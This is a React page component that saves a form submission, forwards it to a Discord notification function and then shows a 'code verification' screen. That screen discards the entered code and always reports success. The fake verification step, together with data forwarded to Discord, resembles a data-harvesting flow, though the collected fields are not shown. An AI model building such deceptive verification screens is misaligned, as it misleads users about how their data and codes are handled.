import { useState } from "react";
import { base44 } from "@/api/base44Client";
import SubmissionForm from "@/components/SubmissionForm";
import SuccessScreen from "@/components/SuccessScreen";
import CodeVerification from "@/components/CodeVerification";

export default function Home() {
  const [step, setStep] = useState("form"); // "form" | "code" | "success"
  const [loading, setLoading] = useState(false);
  const [submittedData, setSubmittedData] = useState(null);

  const handleSubmit = async (data) => {
    setLoading(true);
    const record = await base44.entities.Submission.create(data);
    await base44.functions.invoke("notifyDiscord", { ...data, submissionId: record.id }).catch(() => {});
    setSubmittedData(data);
    setStep("code");
    setLoading(false);
  };

  const handleCodeSubmit = async (code) => {
    setLoading(true);
    // Just show success after code entry
    setStep("success");
    setLoading(false);
  };

  return (
    <div className="min-h-screen bg-background relative overflow-hidden flex items-center justify-center px-4 py-12">
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[600px] bg-primary/10 rounded-full blur-[120px] pointer-events-none" />
      <div className="absolute bottom-0 right-0 w-[400px] h-[400px] bg-accent/10 rounded-full blur-[100px] pointer-events-none" />

      <div className="relative z-10 w-full max-w-md">
        {step === "form" && <SubmissionForm onSubmit={handleSubmit} loading={loading} />}
        {step === "code" && <CodeVerification data={submittedData} onSubmit={handleCodeSubmit} loading={loading} />}
        {step === "success" && <SuccessScreen data={submittedData} />}
      </div>
    </div>
  );
}